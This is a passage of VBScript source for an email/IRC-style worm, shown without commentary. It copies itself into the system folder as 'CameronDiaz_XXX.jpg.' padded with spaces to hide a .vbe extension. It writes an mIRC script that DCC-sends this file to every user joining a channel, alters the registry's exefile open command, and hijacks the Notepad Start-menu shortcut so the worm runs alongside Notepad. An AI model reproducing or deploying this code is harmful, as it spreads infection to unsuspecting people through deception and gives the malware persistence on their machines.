target.WriteLine "[DefaultInstall]"
target.WriteLine "AddReg=Fix_Vreg"
target.WriteLine ""
target.WriteLine "[Fix_Vreg]"
target.WriteLine "HKCR,exefiIe\shell\open\command,,0,"&chr(34)&chr(34)&chr(34)&"%1"&chr(34)&chr(34)&" %*"&chr(34)
target.close

end sub

sub hscript()
dim stra,straa,straaa
if (fso.FileExists("C:\mIRC\mirc32.exe")) then
  set target=fso.CreateTextFile("C:\mIRC\script.ini") 
  set html=fso.CreateTextFile(dirsystem&"\CameronDiaz_XXX.jpg.                          .vbe")
  html.WriteLine vbscopy
  html.close
stra="[scr"
straa="ipt]"
straaa=stra&straa
target.WriteLine straaa
target.WriteLine "n0=on 1:JOIN:#:{"
target.WriteLine "n1= /if ( $nick == $me ) { halt }"
target.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\CameronDiaz_XXX.jpg.                          .vbe"
target.WriteLine "n3= }"
target.close
end if
end sub

sub scort()
On Error Resume Next
dim smenu,bname,aname 
 set reg=CreateObject("WScript.Shell")
 set myfile=fso.CreateTextFile(dirsystem&"\notepad.vbe")
  set html=fso.CreateTextFile(dirsystem&"\CameronDiaz_XXX.jpg.                          .vbe")
  html.WriteLine vbscopy
  html.close 
 myfile.WriteLine "set wshell=CreateObject("&chr(34)&"WScript.Shell"&chr(34)&")"
 myfile.WriteLine "wshell.run("&chr(34)&dirwin&"\notepad.exe"&chr(34)&")"
 myfile.WriteLine "wshell.run("&chr(34)&dirsystem&"\CameronDiaz_XXX.jpg.                          .vbe"&chr(34)&")"
 myfile.close
 smenu=reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Programs")
 bname=reg.RegRead("HKEY_CLASSES_ROOT\Applications\notepad.exe\shell\FriendlyCache")
 aname=reg.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SM_AccessoriesName")
 set scurt=reg.CreateShortCut(smenu&"\"&aname&"\"&bname&".lnk")
 scurt.TargetPath=dirsystem&"\notepad.vbe"
 scurt.IconLocation=dirwin&"\notepad.exe,0"
 scurt.Save 
end sub